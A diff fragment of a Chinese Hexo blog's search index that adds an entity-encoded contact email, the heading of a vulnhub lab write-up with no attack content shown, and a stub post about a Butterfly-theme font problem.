+<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#x6b;&#107;&#x65;&#x77;&#121;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;">&#107;&#101;&#x65;&#x6b;&#107;&#x65;&#x77;&#121;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;</a></p>
 <p>2022年9月27日</p>
 </blockquote>
 <h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
@@ -3335,6 +3322,19 @@
         <tag>安全</tag>
         <tag>Linux</tag>
         <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Butterfly 主题自定义字体无效</title>
+    <url>/solution1/</url>
+    <content><![CDATA[<p>待续</p>
+]]></content>
+      <categories>
+        <category>问题记录</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>CSS</tag>
       </tags>
   </entry>
 </search>
